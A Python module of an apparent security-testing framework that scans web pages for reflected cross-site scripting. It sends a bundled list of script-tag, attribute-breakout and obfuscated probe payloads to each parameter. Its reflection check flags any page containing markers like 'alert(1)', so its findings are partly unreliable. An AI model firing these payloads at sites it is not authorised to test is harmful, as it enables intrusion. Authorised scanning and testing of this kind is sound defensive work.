#!/usr/bin/env python3
"""
XSS Scanner Module for Oxysintx Framework

Integrated with AnalyticDataManager (modules/analytic_manager.py).
Provides advanced reflected XSS detection with multiple payload contexts,
multi-threaded testing, and robust reflection analysis.

Author: Yanxzyx
"""

import argparse
import html
import json
import logging
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlencode, urlparse, parse_qs, quote

import requests
from requests.exceptions import RequestException

# Configure module logger
logger = logging.getLogger("oxysintx.xss")

# ---------------------------------------------------------------------------
# Tool metadata (consumed by the scan orchestrator + Security Testing UI)
# ---------------------------------------------------------------------------
TOOL_INFO = {
    "name": "XSS Scanner",
    "version": "1.1.0",
    "description": (
        "Reflected Cross-Site Scripting scanner. Basic: fast core + attribute-"
        "breakout payloads on the URL's query parameters. Expert: the full "
        "multi-context payload set (JS / event-handler / obfuscated) with more "
        "threads and redirect following."
    ),
    "category": "Web Vulnerability",
    "author": "Yanxzyx",
}


class PayloadSet:
    """Curated XSS payloads organized by injection context."""

    BASIC = [
        "<script>alert(1)</script>",
        "<script>alert(document.domain)</script>",
        "<script>prompt(1)</script>",
        "<script>confirm(1)</script>",
        "<script>console.log(1)</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<video><source onerror=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
    ]

    ATTRIBUTE_BREAKOUT = [
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "'><img src=x onerror=alert(1)>",
        "\"><svg/onload=alert(1)>",
        "'><svg/onload=alert(1)>",
        "\" onmouseover=alert(1) x=\"",
        "' onmouseover=alert(1) x='",
        "` onmouseover=alert(1) x=`",
    ]

    JAVASCRIPT_CONTEXT = [
        "javascript:alert(1)",
        "';alert(1);//",
        "\";alert(1);//",
        "');alert(1);//",
        "\");alert(1);//",
        "alert(1)//",
        "alert(1)",
        "`;alert(1);//",
    ]

    EVENT_HANDLERS = [
        "onload=alert(1)",
        "onerror=alert(1)",
        "onmouseover=alert(1)",
        "onfocus=alert(1)",
        "onclick=alert(1)",
        "onkeydown=alert(1)",
        "onchange=alert(1)",
    ]

    OBFUSCATED = [
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<script>alert(String.fromCharCode(49))</script>",
        "<img src=x onerror=\"alert('XSS')\">",
        "<svg><script>alert(1)</script></svg>",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></style></mtext></math>",
    ]

    ALL = (
        BASIC
        + ATTRIBUTE_BREAKOUT
        + JAVASCRIPT_CONTEXT
        + EVENT_HANDLERS
        + OBFUSCATED
    )


class ReflectionDetector:
    """Determine if a payload is reflected in the response body."""

    @staticmethod
    def is_reflected(payload: str, response_text: str) -> bool:
        """
        Check if the payload appears in the response.
        Handles partial encoding and common sanitization patterns.
        """
        if not payload or not response_text:
            return False

        # Exact match
        if payload in response_text:
            return True

        # HTML entity encoded
        entity_encoded = html.escape(payload)
        if entity_encoded in response_text:
            return True

        # URL encoded
        url_encoded = quote(payload)
        if url_encoded in response_text:
            return True

        # Case-insensitive match for HTML entities
        lower_payload = payload.lower()
        lower_response = response_text.lower()
        if lower_payload in lower_response:
            return True

        # Check for execution markers
        markers = ["alert(1)", "alert(document.domain)", "onerror=alert", "svg/onload"]
        for marker in markers:
            if marker in response_text.lower():
                return True

        return False


class XSSScanner:
    """Professional reflected XSS scanner with multi-threading and advanced detection."""

    def __init__(
        self,
        timeout: float = 5.0,
        verify_ssl: bool = False,
        follow_redirects: bool = False,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
        proxies: Optional[Dict[str, str]] = None,
        max_threads: int = 10,
        user_agent: str = "Mozilla/5.0 (XSS Scanner; Oxysintx Framework)",
    ):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.follow_redirects = follow_redirects
        self.headers = headers or {"User-Agent": user_agent}
        self.cookies = cookies
        self.proxies = proxies
        self.max_threads = max_threads
        self.session = requests.Session()
        self.session.verify = self.verify_ssl
        self.session.headers.update(self.headers)
        if self.cookies:
            self.session.cookies.update(self.cookies)
        if self.proxies:
            self.session.proxies.update(self.proxies)

    def _send_request(
        self,
        url: str,
        method: str = "GET",
        params: Optional[Dict] = None,
        data: Optional[Dict] = None,
    ) -> Optional[requests.Response]:
        """Send HTTP request with error handling."""
        try:
            if method.upper() == "GET":
                response = self.session.get(
                    url,
                    params=params,
                    timeout=self.timeout,
                    allow_redirects=self.follow_redirects,
                )
            else:
                response = self.session.post(
                    url,
                    data=data,
                    timeout=self.timeout,
                    allow_redirects=self.follow_redirects,
                )
            return response
        except RequestException as e:
            logger.warning(f"Request failed for {url}: {e}")
            return None

    def _test_payload(
        self,
        url: str,
        method: str,
        payload: str,
        param_name: str,
        static_params: Optional[Dict] = None,
    ) -> Optional[Dict]:
        """Test a single payload against a single parameter."""
        if method.upper() == "GET":
            params = static_params.copy() if static_params else {}
            params[param_name] = payload
            response = self._send_request(url, method, params=params)
        else:
            data = static_params.copy() if static_params else {}
            data[param_name] = payload
            response = self._send_request(url, method, data=data)

        if response is None:
            return None

        if ReflectionDetector.is_reflected(payload, response.text):
            return {
                "url": url,
                "method": method,
                "parameter": param_name,
                "payload": payload,
                "status_code": response.status_code,
                "reflected": True,
            }
        return None

    def extract_parameters(self, url: str) -> Dict[str, str]:
        """Extract query parameters from a URL."""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        # Flatten list values
        params = {}
        for key, values in query_params.items():
            if values:
                params[key] = values[0]
        return params

    def scan(
        self,
        url: str,
        method: str = "GET",
        params: Optional[Dict[str, str]] = None,
        payloads: Optional[List[str]] = None,
    ) -> Dict:
        """
        Scan a URL for reflected XSS.

        Args:
            url: Target URL.
            method: HTTP method (GET or POST).
            params: Dictionary of parameters to test. If None, extract from URL query.
            payloads: Custom list of payloads. If None, use default set.

        Returns:
            Dictionary with scan results.
        """
        payloads = payloads or PayloadSet.ALL
        findings = []
        tested_count = 0

        # Determine parameter set
        if params is None:
            params = self.extract_parameters(url)
            if not params:
                params = {"q": ""}  # default parameter if none found

        # If no parameters, still test with a default
        if not params:
            params = {"q": ""}

        # Build static parameter dict (all params except the one being injected)
        for param_name, param_value in params.items():
            static_params = {
                k: v for k, v in params.items() if k != param_name
            }
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                futures = []
                for payload in payloads:
                    tested_count += 1
                    future = executor.submit(
                        self._test_payload,
                        url,
                        method,
                        payload,
                        param_name,
                        static_params,
                    )
                    futures.append(future)

                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        findings.append(result)

        # Deduplicate findings
        seen = set()
        unique_findings = []
        for f in findings:
            key = (f["parameter"], f["payload"])
            if key not in seen:
                seen.add(key)
                unique_findings.append(f)

        return {
            "url": url,
            "method": method,
            "parameters_tested": list(params.keys()),
            "payloads_tested": tested_count,
            "findings": unique_findings,
            "vulnerable": len(unique_findings) > 0,
        }


def run_xss_scan(
    url: str,
    method: str = "GET",
    params: Optional[Dict[str, str]] = None,
    timeout: float = 5.0,
    max_threads: int = 10,
    verify_ssl: bool = False,
    headers: Optional[Dict[str, str]] = None,
    cookies: Optional[Dict[str, str]] = None,
    proxies: Optional[Dict[str, str]] = None,
    payloads: Optional[List[str]] = None,
) -> Dict:
    """
    Entry point for analytic_manager integration.
    Runs a reflected XSS scan and returns results in a dictionary.

    Returns:
        dict with keys: url, method, parameters_tested, payloads_tested,
                        findings, vulnerable
    """
    scanner = XSSScanner(
        timeout=timeout,
        verify_ssl=verify_ssl,
        headers=headers,
        cookies=cookies,
        proxies=proxies,
        max_threads=max_threads,
    )
    return scanner.scan(url, method, params, payloads)


def _normalize_url(target: str) -> str:
    """Ensure the target has a scheme so requests can reach it."""
    t = (target or "").strip()
    if not t.lower().startswith(("http://", "https://")):
        t = "http://" + t
    return t


def run(target: str, mode: str = "basic", **kwargs) -> dict:
    """Scan orchestrator entry point.

    Normalises the target to a URL, picks a payload set + concurrency based on
    ``mode`` and returns the framework's standard result envelope:

        {tool, version, target, data: {...}, error}

    The ``data`` block carries the scanner output plus a ``scan_type`` marker
    and a ``severity`` the dashboard uses to colour the result card.
    """
    url = _normalize_url(target)

    if mode == "expert":
        payloads = PayloadSet.ALL
        max_threads = int(kwargs.get("max_threads", 12))
        follow_redirects = True
    else:
        payloads = PayloadSet.BASIC + PayloadSet.ATTRIBUTE_BREAKOUT
        max_threads = int(kwargs.get("max_threads", 8))
        follow_redirects = bool(kwargs.get("follow_redirects", True))

    try:
        scanner = XSSScanner(
            timeout=float(kwargs.get("timeout", 6.0)),
            verify_ssl=bool(kwargs.get("verify_ssl", False)),
            follow_redirects=follow_redirects,
            max_threads=max_threads,
        )
        result = scanner.scan(
            url,
            method=str(kwargs.get("method", "GET")),
            params=kwargs.get("params"),
            payloads=payloads,
        )

        vulnerable = bool(result.get("vulnerable"))
        result["scan_type"] = "xss"
        result["mode"] = mode
        result["severity"] = "high" if vulnerable else "safe"
        result["summary"] = (
            f"{len(result.get('findings', []))} reflected XSS vector(s) found"
            if vulnerable else "No reflected XSS detected"
        )
        return {
            "tool": "xss",
            "version": TOOL_INFO["version"],
            "target": target,
            "data": result,
            "error": None,
        }
    except Exception as e:
        logger.error("XSS run() failed for %s: %s", url, e, exc_info=True)
        return {
            "tool": "xss",
            "version": TOOL_INFO["version"],
            "target": target,
            "data": {"url": url, "scan_type": "xss", "vulnerable": False, "findings": []},
            "error": str(e),
        }


def main():
    """Command-line interface for standalone usage."""
    parser = argparse.ArgumentParser(
        description="Professional Reflected XSS Scanner (Oxysintx Module)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("url", help="Target URL")
    parser.add_argument(
        "-m",
        "--method",
        default="GET",
        choices=["GET", "POST"],
        help="HTTP method",
    )
    parser.add_argument(
        "-p",
        "--param",
        action="append",
        help="Parameter to test (can be repeated). Format: name=value",
    )
    parser.add_argument(
        "--data",
        help="POST data as query string (e.g., 'user=admin&pass=123')",
    )
    parser.add_argument(
        "--payloads",
        nargs="+",
        help="Custom payload list (space-separated)",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=5.0,
        help="Request timeout in seconds",
    )
    parser.add_argument(
        "--threads",
        type=int,
        default=10,
        help="Max concurrent threads",
    )
    parser.add_argument(
        "--headers",
        action="append",
        help="Custom header (format: 'Key: Value')",
    )
    parser.add_argument(
        "--cookie",
        help="Cookie string (e.g., 'session=abc123')",
    )
    parser.add_argument(
        "--proxy",
        help="Proxy URL (e.g., 'http://127.0.0.1:8080')",
    )
    parser.add_argument(
        "--no-verify",
        action="store_true",
        help="Disable SSL certificate verification",
    )
    parser.add_argument(
        "--json",
        action="store_true",
        help="Output results in JSON format",
    )
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Enable verbose logging",
    )

    args = parser.parse_args()

    if args.verbose:
        logger.setLevel(logging.DEBUG)
    else:
        logger.setLevel(logging.INFO)

    # Build headers
    headers = {}
    if args.headers:
        for h in args.headers:
            if ":" in h:
                key, value = h.split(":", 1)
                headers[key.strip()] = value.strip()

    # Build cookies
    cookies = None
    if args.cookie:
        cookies = {}
        for pair in args.cookie.split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                cookies[k.strip()] = v.strip()

    # Build proxies
    proxies = None
    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}

    # Parse custom parameters
    params = {}
    if args.param:
        for p in args.param:
            if "=" in p:
                key, value = p.split("=", 1)
                params[key] = value
            else:
                params[p] = ""

    if args.data:
        for pair in args.data.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                params[k] = v

    # Set custom payloads if provided
    payloads = args.payloads if args.payloads else None

    # Run scan
    result = run_xss_scan(
        url=args.url,
        method=args.method,
        params=params if params else None,
        timeout=args.timeout,
        max_threads=args.threads,
        verify_ssl=not args.no_verify,
        headers=headers,
        cookies=cookies,
        proxies=proxies,
        payloads=payloads,
    )

    if args.json:
        print(json.dumps(result, indent=2))
    else:
        print(f"\nResults for {args.url}:")
        print(f"  Vulnerable: {result['vulnerable']}")
        print(f"  Payloads tested: {result['payloads_tested']}")
        if result["findings"]:
            print("  Findings:")
            for f in result["findings"]:
                print(
                    f"    Parameter: {f['parameter']} | "
                    f"Payload: {f['payload'][:60]} | "
                    f"Status: {f['status_code']}"
                )
        else:
            print("  No reflections detected.")


if __name__ == "__main__":
    main()
